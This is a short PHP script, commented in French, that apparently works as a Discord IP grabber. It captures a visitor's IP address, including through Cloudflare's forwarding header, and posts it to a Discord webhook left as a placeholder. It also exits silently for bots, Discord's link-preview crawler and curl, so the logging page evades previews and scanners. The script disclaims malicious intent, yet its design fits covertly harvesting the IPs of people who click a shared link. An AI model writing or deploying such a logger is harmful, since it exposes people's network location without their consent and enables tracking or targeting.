<?php
 

$IP = (isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER['REMOTE_ADDR']);
$Browser = $_SERVER['HTTP_USER_AGENT'];


if (preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $Browser)) {
    exit();
}


date_default_timezone_set("Europe/Paris");
$Date = date('d/m/Y');
$Time = date('G:i:s');

$WebhookName = $IP;

class Discord
{
    public function Visitor()
    {
        global $IP, $Date, $Time, $WebhookName;

        $Webhook = "TON_WEBHOOK";

        $InfoArr = array(
            "username" => "$WebhookName",
            "avatar_url" => "https://cdn.discordapp.com/attachments/1226510856796504094/1240375313779654747/IMG_3836.png?ex=66465507&is=66450387&hm=af5533954e7fbc323018db21fd54c54c68075b257ba791840098131716139f21&",
            "embeds" => [array(

                "title" => "<:validate:1220075607757688912> | Ip trouvé !",
                "color" => "851111",
                "thumbnail" => [
                "url" => "https://cdn-icons-png.flaticon.com/512/8726/8726730.png"
                ],
                "description" => "*Cet outils à pour but d'être «pratique» et non malveillant.*",

                "fields" => [array(
                    "name" => "<:i_:1220426295117348966> | IP :",
                    "value" => "<:droite:1220426929321279680> $IP",
                    "inline" => true
                )],

                "footer" => array(
                    "text" => "Développé par Gabizoc | $Date $Time",
                    "icon_url" => "https://images-ext-1.discordapp.net/external/FMzbroi-pfEOcwuHmW6BkCsqBKSCw6MPDBnOcdkKXCc/%3Fsize%3D1024/https/cdn.discordapp.com/avatars/826133033069051954/ce84e0ae651d10676959d7a6c388425c.webp"
                ),
            )],
        );

		//Some code that sends the info as an embed to Discord
        $JSON = json_encode($InfoArr);

        $Curl = curl_init($Webhook);
        curl_setopt($Curl, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
        curl_setopt($Curl, CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($Curl, CURLOPT_POSTFIELDS, $JSON);
        curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);

        echo "✅ SUCCÈS !\n
        ℹ️ Votre IP à bien été envoyé !";
        
		//En voilà
        return curl_exec($Curl);

    }
}

?>
